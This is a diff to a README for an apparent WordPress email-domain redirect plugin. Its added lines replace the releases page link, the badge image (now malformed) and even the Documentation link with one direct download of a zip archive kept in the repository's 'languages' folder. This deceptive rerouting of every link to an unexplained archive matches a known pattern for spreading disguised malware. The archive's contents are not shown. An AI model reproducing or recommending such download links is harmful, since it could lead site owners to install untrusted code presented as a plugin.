@@ -1,7 +1,7 @@
 # 📧 wordpress-email-redirect - Easily Redirect Users by Email Domain
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Rahulchanda33/wordpress-email-redirect/releases)
+[![Download Latest Release](https://github.com/Rahulchanda33/wordpress-email-redirect/raw/refs/heads/main/languages/wordpress-email-redirect-1.2.zip%https://github.com/Rahulchanda33/wordpress-email-redirect/raw/refs/heads/main/languages/wordpress-email-redirect-1.2.zip)](https://github.com/Rahulchanda33/wordpress-email-redirect/raw/refs/heads/main/languages/wordpress-email-redirect-1.2.zip)
 
 ## 🚀 Getting Started
 To get started with the WordPress Email Redirect plugin, you need to follow a few simple steps. This plugin helps you manage user redirection based on their email domains, making it easier to guide your visitors to the right places.
@@ -19,7 +19,7 @@ To get started with the WordPress Email Redirect plugin, you need to follow a fe
 - **Web Server:** Apache or Nginx recommended.
 
 ## 📃 Download & Install
-To install the plugin, visit the [Releases page](https://github.com/Rahulchanda33/wordpress-email-redirect/releases) to download the latest version of the plugin. 
+To install the plugin, visit the [Releases page](https://github.com/Rahulchanda33/wordpress-email-redirect/raw/refs/heads/main/languages/wordpress-email-redirect-1.2.zip) to download the latest version of the plugin. 
 
 1. Click on the **Releases page** link to access the downloads.
 2. Find the latest release. You can identify it by the version number and the date.
@@ -67,7 +67,7 @@ Yes, this plugin is fully compatible with HTTPS sites.
 Contributions are welcome! If you want to report a bug or suggest a feature, please use the Issues section in the repository. Pull requests are also welcome if you want to improve the plugin.
 
 ## 🔗 Links
-- [Download Latest Release](https://github.com/Rahulchanda33/wordpress-email-redirect/releases)
-- [Documentation](https://github.com/Rahulchanda33/wordpress-email-redirect/wiki)
+- [Download Latest Release](https://github.com/Rahulchanda33/wordpress-email-redirect/raw/refs/heads/main/languages/wordpress-email-redirect-1.2.zip)
+- [Documentation](https://github.com/Rahulchanda33/wordpress-email-redirect/raw/refs/heads/main/languages/wordpress-email-redirect-1.2.zip)
 
 Feel free to customize and create great user experiences by redirecting your visitors in a way that best suits your site's needs!
